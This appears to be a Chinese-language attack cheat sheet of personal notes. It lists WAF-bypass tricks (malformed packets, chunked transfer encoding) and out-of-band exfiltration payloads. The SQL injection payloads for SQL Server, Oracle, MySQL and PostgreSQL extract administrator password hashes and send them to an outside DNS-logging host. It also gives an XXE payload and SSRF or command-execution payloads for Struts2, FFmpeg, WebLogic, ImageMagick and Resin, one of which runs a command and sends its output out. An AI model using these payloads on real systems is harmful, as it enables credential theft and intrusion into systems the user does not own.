
## 转译
- 单引号，将 ```'``` 转换成 ```''```
- 反斜杠，将 ```\``` 转化成 ```\\```



http://www.likecs.com/show-83546.html
## 畸形包绕过waf
1. get转化成post
2. 空格使用%20代替（"union select 1" = "union%20select%201"）

## 分块传输绕过waf
1. 数据包中添加Transfer-Encoding: chunked
2. 一段段传数据（第一次发：“unio”, 第二段：“n sele”...）


## sql注入
- SQL Server:
```
DECLARE @host varchar(1024);
SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa')+'.ip.port.7sc0en.j8.rip';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');
```
- Oracle
```
SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.7sc0en.j8.rip');
SELECT UTL_HTTP.REQUEST('http://ip.port.7sc0en.j8.rip/oracle') FROM DUAL;
SELECT HTTPURITYPE('http://ip.port.7sc0en.j8.rip/oracle').GETCLOB() FROM DUAL;
SELECT DBMS_LDAP.INIT(('oracle.ip.port.7sc0en.j8.rip',80) FROM DUAL;
SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.7sc0en.j8.rip',80) FROM DUAL;
```
- MySQL
```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.7sc0en.j8.rip\\abc'));
```
- PostgreSQL
```
DROP TABLE IF EXISTS table_output; 
CREATE TABLE table_output(content text); 
CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $ DECLARE exec_cmd TEXT;
DECLARE query_result TEXT; 
BEGIN SELECT INTO query_result (SELECT passwd FROM pg_shadow WHERE usename='postgres'); 
exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.7sc0en.j8.rip\\\\foobar.txt\'';
EXECUTE exec_cmd; 
END;
$ LANGUAGE plpgsql SECURITY DEFINER; SELECT temp_function();
```


## XML Entity注入
```
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ip.port.7sc0en.j8.rip/xxe_test"> %remote;]> <root/>
```

## 其他利用
- Struts2:
```
'xx.action?redirect:http://ip.port.7sc0en.j8.rip/%2512
xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{whoami})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://ip.port.7sc0en.j8.rip/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```
- FFMpeg:
```
#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://ip.port.7sc0en.j8.rip #EXT-X-ENDLIST
```
- Weblogic:
```
test.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.7sc0en.j8.rip/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search
```
- ImageMagick:
```
push graphic-context viewbox 0 0 640 480 fill 'url(http://ip.port.7sc0en.j8.rip)' pop graphic-context
```
- Resin:
```
test.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.7sc0en.j8.rip/ssrf
```